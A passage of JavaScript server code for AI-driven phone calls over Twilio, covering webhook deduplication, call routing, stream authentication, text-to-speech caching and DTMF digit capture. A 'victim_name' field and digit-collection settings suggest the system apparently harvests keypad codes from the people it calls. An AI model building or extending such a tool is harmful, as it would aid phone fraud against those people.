  const callSid = payload.CallSid || payload.callSid || "unknown";
  const status = normalizeCallStatus(
    payload.CallStatus || payload.callStatus || "unknown",
  );
  const sequence =
    payload.SequenceNumber ||
    payload.sequenceNumber ||
    payload.Sequence ||
    payload.sequence ||
    "";
  const timestamp =
    payload.Timestamp ||
    payload.timestamp ||
    payload.EventTimestamp ||
    payload.eventTimestamp ||
    "";
  return `${callSid}:${status}:${sequence}:${timestamp}`;
}

function shouldProcessCallStatusPayload(payload = {}, options = {}) {
  if (options.skipDedupe) return true;
  const callSid = payload.CallSid || payload.callSid;
  if (!callSid) return true;
  const key = buildCallStatusDedupeKey(payload);
  const now = Date.now();
  const lastSeen = callStatusDedupe.get(key);
  if (lastSeen && now - lastSeen < CALL_STATUS_DEDUPE_MS) {
    return false;
  }
  callStatusDedupe.set(key, now);
  pruneDedupeMap(callStatusDedupe, CALL_STATUS_DEDUPE_MAX);
  return true;
}

function purgeCallStatusDedupe(callSid) {
  if (!callSid) return;
  const prefix = `${callSid}:`;
  for (const key of callStatusDedupe.keys()) {
    if (key.startsWith(prefix)) {
      callStatusDedupe.delete(key);
    }
  }
}

function recordCallLifecycle(callSid, status, meta = {}) {
  if (!callSid || !status) return false;
  const normalized = normalizeCallStatus(status);
  const prev = callLifecycle.get(callSid)?.status;
  if (prev === normalized) return false;
  const updatedAt = new Date().toISOString();
  callLifecycle.set(callSid, { status: normalized, updatedAt });
  db?.updateCallState?.(callSid, `status_${normalized}`, {
    status: normalized,
    prev_status: prev || null,
    source: meta.source || null,
    raw_status: meta.raw_status || meta.rawStatus || null,
    answered_by: meta.answered_by || meta.answeredBy || null,
    duration: meta.duration || null,
    at: updatedAt,
  }).catch(() => {});
  emitMiniappEvent("call.status", callSid, {
    status: normalized,
    prev_status: prev || null,
    source: meta.source || null,
  });
  return true;
}

function scheduleCallLifecycleCleanup(callSid, delayMs = 10 * 60 * 1000) {
  if (!callSid) return;
  if (callLifecycleCleanupTimers.has(callSid)) {
    clearTimeout(callLifecycleCleanupTimers.get(callSid));
  }
  const timer = setTimeout(() => {
    callLifecycleCleanupTimers.delete(callSid);
    purgeCallStatusDedupe(callSid);
    callLifecycle.delete(callSid);
  }, delayMs);
  callLifecycleCleanupTimers.set(callSid, timer);
}

function normalizeBodyForSignature(req) {
  const method = String(req.method || "GET").toUpperCase();
  if (["GET", "HEAD"].includes(method)) {
    return "";
  }
  const contentLength = Number(req.headers["content-length"] || 0);
  const hasBody = Number.isFinite(contentLength) && contentLength > 0;
  if (!req.body || Object.keys(req.body).length === 0) {
    return hasBody ? stableStringify(req.body || {}) : "";
  }
  return stableStringify(req.body);
}

function buildHmacPayload(req, timestamp) {
  const method = String(req.method || "GET").toUpperCase();
  const path = req.originalUrl || req.url || "/";
  const body = normalizeBodyForSignature(req);
  return `${timestamp}.${method}.${path}.${body}`;
}

function normalizePhoneDigits(value) {
  return String(value || "").replace(/\D/g, "");
}

function normalizePhoneForFlag(value) {
  const digits = normalizePhoneDigits(value);
  if (!digits) return null;
  return `+${digits}`;
}

function getInboundRateKey(req, payload = {}) {
  const from =
    payload.From || payload.from || payload.Caller || payload.caller || null;
  const normalized = normalizePhoneForFlag(from);
  if (normalized) return normalized;
  return req?.ip || req?.headers?.["x-forwarded-for"] || "unknown";
}

function shouldRateLimitInbound(req, payload = {}) {
  const max = Number(config.inbound?.rateLimitMax) || 0;
  const windowMs = Number(config.inbound?.rateLimitWindowMs) || 60000;
  if (!Number.isFinite(max) || max <= 0) {
    return { limited: false, key: null };
  }
  const key = getInboundRateKey(req, payload);
  const now = Date.now();
  const bucket = inboundRateBuckets.get(key);
  if (!bucket || now - bucket.windowStart >= windowMs) {
    inboundRateBuckets.set(key, { count: 1, windowStart: now });
    return { limited: false, key };
  }
  bucket.count += 1;
  inboundRateBuckets.set(key, bucket);
  return {
    limited: bucket.count > max,
    key,
    count: bucket.count,
    resetAt: bucket.windowStart + windowMs,
  };
}

function normalizeTwilioDirection(value) {
  return String(value || "")
    .trim()
    .toLowerCase();
}

function isOutboundTwilioDirection(value) {
  const direction = normalizeTwilioDirection(value);
  return direction ? direction.startsWith("outbound") : false;
}

function resolveInboundRoute(toNumber) {
  const routes = config.inbound?.routes || {};
  if (!toNumber || !routes || typeof routes !== "object") return null;
  const normalizedTo = normalizePhoneDigits(toNumber);
  if (!normalizedTo) return routes[toNumber] || null;

  if (routes[toNumber]) return routes[toNumber];
  if (routes[normalizedTo]) return routes[normalizedTo];
  if (routes[`+${normalizedTo}`]) return routes[`+${normalizedTo}`];

  for (const [key, value] of Object.entries(routes)) {
    if (normalizePhoneDigits(key) === normalizedTo) {
      return value;
    }
  }
  return null;
}

function buildInboundDefaults(route = {}) {
  const fallbackPrompt =
    config.inbound?.defaultPrompt || DEFAULT_INBOUND_PROMPT;
  const fallbackFirst =
    config.inbound?.defaultFirstMessage || DEFAULT_INBOUND_FIRST_MESSAGE;
  const prompt = route.prompt || inboundDefaultScript?.prompt || fallbackPrompt;
  const firstMessage =
    route.first_message ||
    route.firstMessage ||
    inboundDefaultScript?.first_message ||
    fallbackFirst;
  return { prompt, firstMessage };
}

function buildInboundCallConfig(callSid, payload = {}) {
  const route =
    resolveInboundRoute(
      payload.To || payload.to || payload.called || payload.Called,
    ) || {};
  const routeLabel = route.label || route.name || route.route_label || null;
  const { prompt, firstMessage } = buildInboundDefaults(route);
  const functionSystem = functionEngine.generateAdaptiveFunctionSystem(
    prompt,
    firstMessage,
  );
  const createdAt = new Date().toISOString();
  const hasRoutePrompt = Boolean(
    route.prompt || route.first_message || route.firstMessage,
  );
  const fallbackScript = !hasRoutePrompt ? inboundDefaultScript : null;
  const callConfig = {
    prompt,
    first_message: firstMessage,
    created_at: createdAt,
    user_chat_id: config.telegram?.adminChatId || route.user_chat_id || null,
    customer_name: route.customer_name || null,
    provider: "twilio",
    provider_metadata: null,
    business_context: route.business_context || functionSystem.context,
    function_count: functionSystem.functions.length,
    purpose: route.purpose || null,
    business_id: route.business_id || null,
    route_label: routeLabel,
    script: route.script || fallbackScript?.name || null,
    script_id: route.script_id || fallbackScript?.id || null,
    emotion: route.emotion || null,
    urgency: route.urgency || null,
    technical_level: route.technical_level || null,
    voice_model: route.voice_model || null,
    collection_profile: route.collection_profile || null,
    collection_expected_length: route.collection_expected_length || null,
    collection_timeout_s: route.collection_timeout_s || null,
    collection_max_retries: route.collection_max_retries || null,
    collection_mask_for_gpt: route.collection_mask_for_gpt,
    collection_speak_confirmation: route.collection_speak_confirmation,
    firstMediaTimeoutMs:
      route.first_media_timeout_ms ||
      route.firstMediaTimeoutMs ||
      config.inbound?.firstMediaTimeoutMs ||
      null,
    flow_state: "normal",
    flow_state_updated_at: createdAt,
    call_mode: "normal",
    digit_capture_active: false,
    inbound: true,
  };
  return { callConfig, functionSystem };
}

async function refreshInboundDefaultScript(force = false) {
  if (!db) return null;
  const now = Date.now();
  if (
    !force &&
    inboundDefaultLoadedAt &&
    now - inboundDefaultLoadedAt < INBOUND_DEFAULT_CACHE_MS
  ) {
    return inboundDefaultScript;
  }
  inboundDefaultLoadedAt = now;

  let settingValue = null;
  try {
    settingValue = await db.getSetting(INBOUND_DEFAULT_SETTING_KEY);
  } catch (error) {
    console.error("Failed to load inbound default setting:", error);
  }

  if (!settingValue || settingValue === "builtin") {
    inboundDefaultScriptId = null;
    inboundDefaultScript = null;
    return inboundDefaultScript;
  }

  const scriptId = Number(settingValue);
  if (!Number.isFinite(scriptId)) {
    inboundDefaultScriptId = null;
    inboundDefaultScript = null;
    return inboundDefaultScript;
  }

  try {
    const script = await db.getCallTemplateById(scriptId);
    if (!script) {
      inboundDefaultScriptId = null;
      inboundDefaultScript = null;
      return inboundDefaultScript;
    }
    inboundDefaultScriptId = scriptId;
    inboundDefaultScript = script;
  } catch (error) {
    console.error("Failed to load inbound default script:", error);
    inboundDefaultScriptId = null;
    inboundDefaultScript = null;
  }
  return inboundDefaultScript;
}

function ensureCallSetup(callSid, payload = {}) {
  let callConfig = callConfigurations.get(callSid);
  let functionSystem = callFunctionSystems.get(callSid);
  if (callConfig && functionSystem) {
    return { callConfig, functionSystem, created: false };
  }

  if (!callConfig) {
    const created = buildInboundCallConfig(callSid, payload);
    callConfig = created.callConfig;
    functionSystem = functionSystem || created.functionSystem;
  } else if (!functionSystem) {
    const { prompt, first_message } = callConfig;
    const promptValue = prompt || DEFAULT_INBOUND_PROMPT;
    const firstValue = first_message || DEFAULT_INBOUND_FIRST_MESSAGE;
    functionSystem = functionEngine.generateAdaptiveFunctionSystem(
      promptValue,
      firstValue,
    );
  }

  callConfigurations.set(callSid, callConfig);
  callFunctionSystems.set(callSid, functionSystem);
  return { callConfig, functionSystem, created: true };
}

async function ensureCallRecord(callSid, payload = {}, source = "unknown") {
  if (!db || !callSid) return null;
  const setup = ensureCallSetup(callSid, payload);
  const existing = await db.getCall(callSid).catch(() => null);
  if (existing) return existing;

  const { callConfig, functionSystem } = setup;
  const from =
    payload.From || payload.from || payload.Caller || payload.caller || null;
  const to =
    payload.To || payload.to || payload.Called || payload.called || null;

  try {
    await db.createCall({
      call_sid: callSid,
      phone_number: from || null,
      prompt: callConfig.prompt,
      first_message: callConfig.first_message,
      user_chat_id: callConfig.user_chat_id || null,
      business_context: JSON.stringify(functionSystem?.context || {}),
      generated_functions: JSON.stringify(
        (functionSystem?.functions || [])
          .map((f) => f.function?.name || f.function?.function?.name || f.name)
          .filter(Boolean),
      ),
      direction: "inbound",
    });
    await db.updateCallState(callSid, "call_created", {
      inbound: true,
      source,
      from: from || null,
      to: to || null,
      business_id: callConfig.business_id || null,
      route_label: callConfig.route_label || null,
      purpose: callConfig.purpose || null,
      voice_model: callConfig.voice_model || null,
    });
    return await db.getCall(callSid);
  } catch (error) {
    console.error("Failed to create inbound call record:", error);
    return null;
  }
}

async function hydrateCallConfigFromDb(callSid) {
  if (!db || !callSid) return null;
  const call = await db.getCall(callSid).catch(() => null);
  if (!call) return null;
  let state = null;
  try {
    state = await db.getLatestCallState(callSid, "call_created");
  } catch (_) {
    state = null;
  }
  let parsedContext = null;
  if (call?.business_context) {
    try {
      parsedContext = JSON.parse(call.business_context);
    } catch (_) {
      parsedContext = null;
    }
  }
  const prompt = call.prompt || DEFAULT_INBOUND_PROMPT;
  const firstMessage = call.first_message || DEFAULT_INBOUND_FIRST_MESSAGE;
  const functionSystem = functionEngine.generateAdaptiveFunctionSystem(
    prompt,
    firstMessage,
  );
  const createdAt = call.created_at || new Date().toISOString();
  const callConfig = {
    prompt,
    first_message: firstMessage,
    created_at: createdAt,
    user_chat_id: call.user_chat_id || null,
    customer_name: state?.customer_name || state?.victim_name || null,
    provider: state?.provider || currentProvider,
    provider_metadata: state?.provider_metadata || null,
    business_context:
      state?.business_context || parsedContext || functionSystem.context,
    function_count: functionSystem.functions.length,
    purpose: state?.purpose || null,
    business_id: state?.business_id || null,
    script: state?.script || null,
    script_id: state?.script_id || null,
    emotion: state?.emotion || null,
    urgency: state?.urgency || null,
    technical_level: state?.technical_level || null,
    voice_model: state?.voice_model || null,
    collection_profile: state?.collection_profile || null,
    collection_expected_length: state?.collection_expected_length || null,
    collection_timeout_s: state?.collection_timeout_s || null,
    collection_max_retries: state?.collection_max_retries || null,
    collection_mask_for_gpt: state?.collection_mask_for_gpt,
    collection_speak_confirmation: state?.collection_speak_confirmation,
    script_policy: state?.script_policy || null,
    flow_state: state?.flow_state || "normal",
    flow_state_updated_at: state?.flow_state_updated_at || createdAt,
    call_mode: state?.call_mode || "normal",
    digit_capture_active: false,
    inbound: false,
  };

  callConfigurations.set(callSid, callConfig);
  callFunctionSystems.set(callSid, functionSystem);
  return { callConfig, functionSystem };
}

function buildStreamAuthToken(callSid, timestamp) {
  const secret = config.streamAuth?.secret;
  if (!secret) return null;
  const payload = `${callSid}.${timestamp}`;
  return crypto.createHmac("sha256", secret).update(payload).digest("hex");
}

function resolveStreamAuthParams(req, extraParams = null) {
  const result = {};
  if (req?.query && Object.keys(req.query).length) {
    Object.assign(result, req.query);
  } else {
    const url = req?.url || "";
    const queryIndex = url.indexOf("?");
    if (queryIndex !== -1) {
      const params = new URLSearchParams(url.slice(queryIndex + 1));
      for (const [key, value] of params.entries()) {
        result[key] = value;
      }
    }
  }
  if (extraParams && typeof extraParams === "object") {
    for (const [key, value] of Object.entries(extraParams)) {
      if (value === undefined || value === null || value === "") continue;
      result[key] = String(value);
    }
  }
  return result;
}

function verifyStreamAuth(callSid, req, extraParams = null) {
  const secret = config.streamAuth?.secret;
  if (!secret) return { ok: true, skipped: true, reason: "missing_secret" };
  const params = resolveStreamAuthParams(req, extraParams);
  const token = params.token || params.signature;
  const timestamp = Number(params.ts || params.timestamp);
  if (!token || !Number.isFinite(timestamp)) {
    return { ok: false, reason: "missing_token" };
  }
  const maxSkewMs = Number(config.streamAuth?.maxSkewMs || 300000);
  const now = Date.now();
  if (Math.abs(now - timestamp) > maxSkewMs) {
    return { ok: false, reason: "timestamp_out_of_range" };
  }
  const expected = buildStreamAuthToken(callSid, String(timestamp));
  if (!expected) return { ok: false, reason: "missing_secret" };
  try {
    const expectedBuf = Buffer.from(expected, "hex");
    const providedBuf = Buffer.from(String(token), "hex");
    if (expectedBuf.length !== providedBuf.length) {
      return { ok: false, reason: "invalid_signature" };
    }
    if (!crypto.timingSafeEqual(expectedBuf, providedBuf)) {
      return { ok: false, reason: "invalid_signature" };
    }
  } catch (error) {
    return { ok: false, reason: "invalid_signature" };
  }
  return { ok: true };
}

function clearCallEndLock(callSid) {
  if (callEndLocks.has(callSid)) {
    callEndLocks.delete(callSid);
  }
}

function clearSilenceTimer(callSid) {
  const timer = silenceTimers.get(callSid);
  if (timer) {
    clearTimeout(timer);
    silenceTimers.delete(callSid);
  }
}

function isCaptureActiveConfig(callConfig) {
  if (!callConfig) return false;
  const flowState = callConfig.flow_state;
  if (flowState === "capture_active" || flowState === "capture_pending") {
    return true;
  }
  if (callConfig.call_mode === "dtmf_capture") {
    return true;
  }
  return (
    callConfig?.digit_intent?.mode === "dtmf" &&
    callConfig?.digit_capture_active === true
  );
}

function isCaptureActive(callSid) {
  if (!callSid) return false;
  const callConfig = callConfigurations.get(callSid);
  return isCaptureActiveConfig(callConfig);
}

function resolveVoiceModel(callConfig) {
  const model = callConfig?.voice_model;
  if (model && typeof model === "string" && model.trim()) {
    return model.trim();
  }
  return null;
}

function resolveTwilioSayVoice(callConfig) {
  const model = resolveVoiceModel(callConfig);
  if (!model) return null;
  const normalized = model.toLowerCase();
  if (["alice", "man", "woman"].includes(normalized)) {
    return model;
  }
  if (model.startsWith("Polly.")) {
    return model;
  }
  return null;
}

function resolveDeepgramVoiceModel(callConfig) {
  const model = callConfig?.voice_model;
  if (model && typeof model === "string") {
    const normalized = model.toLowerCase();
    if (
      !["alice", "man", "woman"].includes(normalized) &&
      !model.startsWith("Polly.")
    ) {
      return model;
    }
  }
  return config.deepgram?.voiceModel || "aura-asteria-en";
}

function shouldUseTwilioPlay(callConfig) {
  if (!config.deepgram?.apiKey) return false;
  if (!config.server?.hostname) return false;
  if (config.twilio?.ttsPlayEnabled === false) return false;
  return true;
}

function normalizeTwilioTtsText(text = "") {
  const cleaned = String(text || "").trim();
  if (!cleaned) return "";
  if (cleaned.length > TWILIO_TTS_MAX_CHARS) {
    return "";
  }
  return cleaned;
}

function buildTwilioTtsCacheKey(text, voiceModel) {
  return crypto
    .createHash("sha256")
    .update(`${voiceModel}::${text}`)
    .digest("hex");
}

function pruneTwilioTtsCache() {
  const now = Date.now();
  for (const [key, entry] of twilioTtsCache.entries()) {
    if (!entry || entry.expiresAt <= now) {
      twilioTtsCache.delete(key);
    }
  }
  if (twilioTtsCache.size <= TWILIO_TTS_CACHE_MAX) return;
  const entries = Array.from(twilioTtsCache.entries()).sort(
    (a, b) => (a[1]?.createdAt || 0) - (b[1]?.createdAt || 0),
  );
  const overflow = twilioTtsCache.size - TWILIO_TTS_CACHE_MAX;
  for (let i = 0; i < overflow; i += 1) {
    const entry = entries[i];
    if (entry) {
      twilioTtsCache.delete(entry[0]);
    }
  }
}

async function synthesizeTwilioTtsAudio(text, voiceModel) {
  const model = voiceModel || resolveDeepgramVoiceModel(null);
  const url = `https://api.deepgram.com/v1/speak?model=${encodeURIComponent(model)}&encoding=mulaw&sample_rate=8000&container=none`;
  const response = await fetch(url, {
    method: "POST",
    headers: {
      Authorization: `Token ${config.deepgram.apiKey}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ text }),
    timeout: TWILIO_TTS_FETCH_TIMEOUT_MS,
  });
  if (!response.ok) {
    const errorText = await response.text();
    console.error(
      "Deepgram TTS error:",
      response.status,
      response.statusText,
      errorText,
    );
    return null;
  }
  const arrayBuffer = await response.arrayBuffer();
  const mulawBuffer = Buffer.from(arrayBuffer);
  const wav = new WaveFile();
  wav.fromScratch(1, 8000, "8m", mulawBuffer);
  return {
    buffer: Buffer.from(wav.toBuffer()),
    contentType: "audio/wav",
  };
}

async function getTwilioTtsAudioUrl(text, callConfig, options = {}) {
  const cleaned = normalizeTwilioTtsText(text);
  if (!cleaned) return null;
  if (!shouldUseTwilioPlay(callConfig)) return null;
  const cacheOnly = options?.cacheOnly === true;
  const voiceModel = resolveDeepgramVoiceModel(callConfig);
  const key = buildTwilioTtsCacheKey(cleaned, voiceModel);
  const now = Date.now();
  const cached = twilioTtsCache.get(key);
  if (cached && cached.expiresAt > now) {
    return `https://${config.server.hostname}/webhook/twilio-tts?key=${encodeURIComponent(key)}`;
  }
  const pending = twilioTtsPending.get(key);
  if (pending) {
    if (cacheOnly) {
      return null;
    }
    await pending;
    const refreshed = twilioTtsCache.get(key);
    if (refreshed && refreshed.expiresAt > Date.now()) {
      return `https://${config.server.hostname}/webhook/twilio-tts?key=${encodeURIComponent(key)}`;
    }
    return null;
  }
  if (cacheOnly) {
    const job = (async () => {
      try {
        const audio = await synthesizeTwilioTtsAudio(cleaned, voiceModel);
        if (!audio) return;
        twilioTtsCache.set(key, {
          ...audio,
          createdAt: Date.now(),
          expiresAt: Date.now() + TWILIO_TTS_CACHE_TTL_MS,
        });
        pruneTwilioTtsCache();
      } catch (err) {
        console.error("Twilio TTS synthesis error:", err);
      }
    })();
    twilioTtsPending.set(key, job);
    job.finally(() => {
      if (twilioTtsPending.get(key) === job) {
        twilioTtsPending.delete(key);
      }
    });
    return null;
  }
  const job = (async () => {
    try {
      const audio = await synthesizeTwilioTtsAudio(cleaned, voiceModel);
      if (!audio) return;
      twilioTtsCache.set(key, {
        ...audio,
        createdAt: Date.now(),
        expiresAt: Date.now() + TWILIO_TTS_CACHE_TTL_MS,
      });
      pruneTwilioTtsCache();
    } catch (err) {
      console.error("Twilio TTS synthesis error:", err);
    }
  })();
  twilioTtsPending.set(key, job);
  await job;
  twilioTtsPending.delete(key);
  const refreshed = twilioTtsCache.get(key);
  if (refreshed && refreshed.expiresAt > Date.now()) {
    return `https://${config.server.hostname}/webhook/twilio-tts?key=${encodeURIComponent(key)}`;
  }
  return null;
}

async function getTwilioTtsAudioUrlSafe(text, callConfig, timeoutMs = 1200) {
  const safeTimeoutMs =
    Number.isFinite(timeoutMs) && timeoutMs > 0 ? timeoutMs : 0;
  if (!safeTimeoutMs) {
    return getTwilioTtsAudioUrl(text, callConfig);
  }
  const timeoutPromise = new Promise((resolve) => {
    setTimeout(() => resolve(null), safeTimeoutMs);
  });
  try {
    return await Promise.race([
      getTwilioTtsAudioUrl(text, callConfig),
      timeoutPromise,
    ]);
  } catch (error) {
    console.error("Twilio TTS timeout fallback:", error);
    return null;
  }
}

function maskDigitsForLog(input = "") {
  const digits = String(input || "").replace(/\D/g, "");
  if (!digits) return "0 digits";
  return `${digits.length} digits`;
}

function maskPhoneForLog(input = "") {
  const digits = String(input || "").replace(/\D/g, "");
  if (!digits) return "unknown";
  const tail = digits.slice(-4);
  return `***${tail}`;
}

function maskSmsBodyForLog(body = "") {
  const digits = String(body || "").replace(/\D/g, "");
  if (digits.length >= 2) {
    return `[${digits.length} digits]`;
  }
  const text = String(body || "").trim();
  if (!text) return "[empty]";
  return text.length > 80 ? `${text.slice(0, 77)}...` : text;
}

function queuePendingDigitAction(callSid, action = {}) {
  if (!callSid) return false;
  const callConfig = callConfigurations.get(callSid);
  if (!callConfig) return false;
  if (!Array.isArray(callConfig.pending_digit_actions)) {
    callConfig.pending_digit_actions = [];
  }
  callConfig.pending_digit_actions.push({
    type: action.type,
    text: action.text || "",
    reason: action.reason || null,
    scheduleTimeout: action.scheduleTimeout === true,
  });
  callConfigurations.set(callSid, callConfig);
  return true;
}

function popPendingDigitActions(callSid) {
  const callConfig = callConfigurations.get(callSid);
  if (
    !callConfig ||
    !Array.isArray(callConfig.pending_digit_actions) ||
    !callConfig.pending_digit_actions.length
  ) {
    return [];
  }
  const actions = callConfig.pending_digit_actions.slice(0);
  callConfig.pending_digit_actions = [];
  callConfigurations.set(callSid, callConfig);
  return actions;
}

function clearPendingDigitReprompts(callSid) {
  const callConfig = callConfigurations.get(callSid);
  if (
    !callConfig ||
    !Array.isArray(callConfig.pending_digit_actions) ||
    !callConfig.pending_digit_actions.length
  ) {
    return;
  }
  callConfig.pending_digit_actions = callConfig.pending_digit_actions.filter(
    (action) => action?.type !== "reprompt",
  );
  callConfigurations.set(callSid, callConfig);
}

async function handlePendingDigitActions(
  callSid,
  actions = [],
  gptService,
  interactionCount = 0,
) {
  if (!callSid || !actions.length) return false;
  for (const action of actions) {
    if (!action) continue;
    if (action.type === "end") {
      const reason = action.reason || "digits_collected";
      const message = action.text || CLOSING_MESSAGE;
      await speakAndEndCall(callSid, message, reason);
      return true;
    }
    if (action.type === "reprompt" && gptService && action.text) {
      const personalityInfo =
        gptService?.personalityEngine?.getCurrentPersonality?.();
      gptService.emit(
        "gptreply",
        {
          partialResponseIndex: null,
          partialResponse: action.text,
          personalityInfo,
          adaptationHistory: gptService?.personalityChanges?.slice(-3) || [],
        },
        interactionCount,
      );
      if (digitService) {
        digitService.markDigitPrompted(
          callSid,
          gptService,
          interactionCount,
          "dtmf",
          {
            allowCallEnd: true,
            prompt_text: action.text,
            reset_buffer: true,
          },
        );
        if (action.scheduleTimeout) {
          digitService.scheduleDigitTimeout(
            callSid,
            gptService,
            interactionCount + 1,
          );
        }
      }
    }
  }
  return true;
}

function scheduleSilenceTimer(callSid, timeoutMs = 30000) {
  if (!callSid) return;
  if (callEndLocks.has(callSid)) {
    return;
  }
  if (digitService?.hasExpectation(callSid) || isCaptureActive(callSid)) {
    return;
  }
  clearSilenceTimer(callSid);
  const timer = setTimeout(() => {
    if (!digitService?.hasExpectation(callSid) && !isCaptureActive(callSid)) {
      speakAndEndCall(
        callSid,
        CALL_END_MESSAGES.no_response,
        "silence_timeout",
      );
    }
  }, timeoutMs);
  silenceTimers.set(callSid, timer);
}

function clearFirstMediaWatchdog(callSid) {
  const timer = streamFirstMediaTimers.get(callSid);
  if (timer) {
    clearTimeout(timer);
    streamFirstMediaTimers.delete(callSid);
  }
}

function markStreamMediaSeen(callSid) {
  if (!callSid || streamFirstMediaSeen.has(callSid)) return;
  streamLastMediaAt.set(callSid, Date.now());
  streamFirstMediaSeen.add(callSid);
  clearFirstMediaWatchdog(callSid);
  const startedAt = streamStartTimes.get(callSid);
  if (startedAt) {
    const deltaMs = Math.max(0, Date.now() - startedAt);
    const threshold = Number(config.callSlo?.firstMediaMs);
    const thresholdMs =
      Number.isFinite(threshold) && threshold > 0 ? threshold : null;
    db?.addCallMetric?.(callSid, "first_media_ms", deltaMs, {
      threshold_ms: thresholdMs,
    }).catch(() => {});
    if (thresholdMs && deltaMs > thresholdMs) {
      db?.logServiceHealth?.("call_slo", "degraded", {
        call_sid: callSid,
        metric: "first_media_ms",
        value: deltaMs,
        threshold_ms: thresholdMs,
      }).catch(() => {});
    }
    streamStartTimes.delete(callSid);
  }
  db?.updateCallState?.(callSid, "stream_media", {
    at: new Date().toISOString(),
  }).catch(() => {});
}

function scheduleFirstMediaWatchdog(callSid, host, callConfig) {
  if (!callSid || !callConfig?.inbound) return;
  if (TWILIO_STREAM_TRACK === "inbound_track") {
    return;
  }
  const timeoutMs = Number(
    callConfig.firstMediaTimeoutMs || config.inbound?.firstMediaTimeoutMs,
  );
  if (!Number.isFinite(timeoutMs) || timeoutMs <= 0) return;
  if (streamFirstMediaSeen.has(callSid)) return;
  clearFirstMediaWatchdog(callSid);
  const timer = setTimeout(async () => {
    streamFirstMediaTimers.delete(callSid);
    if (streamFirstMediaSeen.has(callSid)) return;
    webhookService.addLiveEvent(
      callSid,
      "⚠️ No audio detected. Attempting fallback.",
      { force: true },
    );
    await db
      ?.updateCallState?.(callSid, "stream_no_media", {
        at: new Date().toISOString(),
        timeout_ms: timeoutMs,
      })
      .catch(() => {});
    await handleStreamTimeout(callSid, host, {
      allowHangup: false,
      reason: "no_media",
    });
  }, timeoutMs);
  streamFirstMediaTimers.set(callSid, timer);
}

const STREAM_RETRY_SETTINGS = {
  maxAttempts: 1,
  baseDelayMs: 1500,
  maxDelayMs: 8000,
};

function shouldRetryStream(reason = "") {
  return [
    "no_media",
    "stream_not_connected",
    "stream_auth_failed",
    "watchdog_no_media",
  ].includes(reason);
}

async function scheduleStreamReconnect(callSid, host, reason = "unknown") {
  if (!callSid || !config.twilio?.accountSid || !config.twilio?.authToken)
    return false;
  const state = streamRetryState.get(callSid) || {
    attempts: 0,
    nextDelayMs: STREAM_RETRY_SETTINGS.baseDelayMs,
  };
  if (state.attempts >= STREAM_RETRY_SETTINGS.maxAttempts) {
    return false;
  }
  state.attempts += 1;
  const delayMs = Math.min(state.nextDelayMs, STREAM_RETRY_SETTINGS.maxDelayMs);
  state.nextDelayMs = Math.min(
    state.nextDelayMs * 2,
    STREAM_RETRY_SETTINGS.maxDelayMs,
  );
  streamRetryState.set(callSid, state);
  const jitterMs = Math.floor(Math.random() * 250);

  webhookService.addLiveEvent(
    callSid,
    `🔁 Retrying stream (${state.attempts}/${STREAM_RETRY_SETTINGS.maxAttempts})`,
    { force: true },
  );
  setTimeout(async () => {
    try {
      const twiml = buildTwilioStreamTwiml(host, { callSid });
      const client = twilio(config.twilio.accountSid, config.twilio.authToken);
      await client.calls(callSid).update({ twiml });
      await db
        .updateCallState(callSid, "stream_retry", {
          attempt: state.attempts,
          reason,
          at: new Date().toISOString(),
        })
        .catch(() => {});
    } catch (error) {
      console.error(
        `Stream retry failed for ${callSid}:`,
        error?.message || error,
      );
      await db
        .updateCallState(callSid, "stream_retry_failed", {
          attempt: state.attempts,
          reason,
          at: new Date().toISOString(),
          error: error?.message || String(error),
        })
        .catch(() => {});
    }
  }, delayMs + jitterMs);

  return true;
}

const STREAM_WATCHDOG_INTERVAL_MS = 5000;
const STREAM_STALL_DEFAULTS = {
  noMediaMs: 20000,
  noMediaEscalationMs: 45000,
  sttStallMs: 25000,
  sttEscalationMs: 60000,
};

function resolveStreamConnectedAt(callSid) {
  if (!callSid) return null;
  const startedAt = streamStartTimes.get(callSid);
  if (Number.isFinite(startedAt)) {
    return startedAt;
  }
  const connection = activeStreamConnections.get(callSid);
  if (connection?.connectedAt) {
    const parsed = Date.parse(connection.connectedAt);
    if (Number.isFinite(parsed)) {
      return parsed;
    }
  }
  return null;
}

function resolveStreamWatchdogThresholds(callConfig) {
  const sloFirstMedia = Number(config.callSlo?.firstMediaMs) || 4000;
  const inboundFirstMedia = Number(
    callConfig?.firstMediaTimeoutMs || config.inbound?.firstMediaTimeoutMs,
  );
  const noMediaMs =
    Number.isFinite(inboundFirstMedia) && inboundFirstMedia > 0
      ? inboundFirstMedia
      : Math.max(STREAM_STALL_DEFAULTS.noMediaMs, sloFirstMedia * 3);
  const noMediaEscalationMs = Math.max(
    STREAM_STALL_DEFAULTS.noMediaEscalationMs,
    noMediaMs * 2,
  );
  const sttStallMs = Math.max(
    STREAM_STALL_DEFAULTS.sttStallMs,
    sloFirstMedia * 6,
  );
  const sttEscalationMs = Math.max(
    STREAM_STALL_DEFAULTS.sttEscalationMs,
    sttStallMs * 2,
  );
  return { noMediaMs, noMediaEscalationMs, sttStallMs, sttEscalationMs };
}

function getStreamWatchdogState(callSid) {
  if (!callSid) return null;
  const state = streamWatchdogState.get(callSid) || {};
  streamWatchdogState.set(callSid, state);
  return state;
}

async function handleStreamStallNotice(callSid, message, stateKey, state) {
  if (!callSid || !state || state[stateKey]) return false;
  state[stateKey] = Date.now();
  webhookService.addLiveEvent(callSid, message, { force: true });
  return true;
}

async function runStreamWatchdog() {
  const host = config.server?.hostname;
  if (!host) return;
  const now = Date.now();

  for (const [callSid, callConfig] of callConfigurations.entries()) {
    if (!callSid || callEndLocks.has(callSid)) continue;
    const state = getStreamWatchdogState(callSid);
    if (!state) continue;
    const connectedAt = resolveStreamConnectedAt(callSid);
    if (!connectedAt) continue;
    const thresholds = resolveStreamWatchdogThresholds(callConfig);
    const noMediaElapsed = now - connectedAt;

    if (
      !streamFirstMediaSeen.has(callSid) &&
      noMediaElapsed > thresholds.noMediaMs
    ) {
      const notified = await handleStreamStallNotice(
        callSid,
        "⚠️ Stream stalled. Attempting recovery…",
        "noMediaNotifiedAt",
        state,
      );
      if (notified) {
        await db
          ?.updateCallState?.(callSid, "stream_stalled", {
            at: new Date().toISOString(),
            phase: "no_media",
            elapsed_ms: noMediaElapsed,
          })
          .catch(() => {});
        void handleStreamTimeout(callSid, host, {
          allowHangup: false,
          reason: "watchdog_no_media",
        });
        continue;
      }
      if (
        !state.noMediaEscalatedAt &&
        noMediaElapsed > thresholds.noMediaEscalationMs
      ) {
        state.noMediaEscalatedAt = now;
        webhookService.addLiveEvent(
          callSid,
          "⚠️ Stream still offline. Ending call.",
          { force: true },
        );
        void handleStreamTimeout(callSid, host, {
